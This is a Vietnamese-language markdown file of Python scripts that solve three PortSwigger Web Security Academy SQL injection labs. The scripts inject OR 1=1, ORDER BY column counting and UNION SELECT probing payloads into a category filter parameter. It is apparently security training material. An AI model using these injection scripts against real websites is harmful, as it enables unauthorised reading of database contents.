# Mục lục
- [Lab 1](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-1)
- [Lab 3](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-3)
- [Lab 4](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/solveLabByPython.md#lab-4)


# LAB 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```python
import requests
print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
target_url = f"{url}/filter?category=Gifts'+OR+1=1+--"

response = requests.get(target_url)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

# LAB 3: SQL injection UNION attack, determining the number of columns returned by the query
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")


i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

null_values = ",+".join(["NULL"] * i)
union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{null_values}--"

print(f"Payload UNION: {union_url}")
response = requests.get(union_url)

if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

# LAB 4: SQL injection UNION attack, finding a column containing text
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
print("Ví dụ: Giá trị được lab cung cấp: aNjdF")
value = input("Giá trị được lab cung cấp: ")

i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

for pos in range(i):
    test_values = ["NULL"] * i  
    test_values[pos] = f"'{value}'"  

    null_values = ",+".join(test_values)
    union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{null_values}--"
    
    print(f"Thử payload: {union_url}")
    response = requests.get(union_url)
    
    if response.status_code == 200:
        print("Successful")
        break 
```



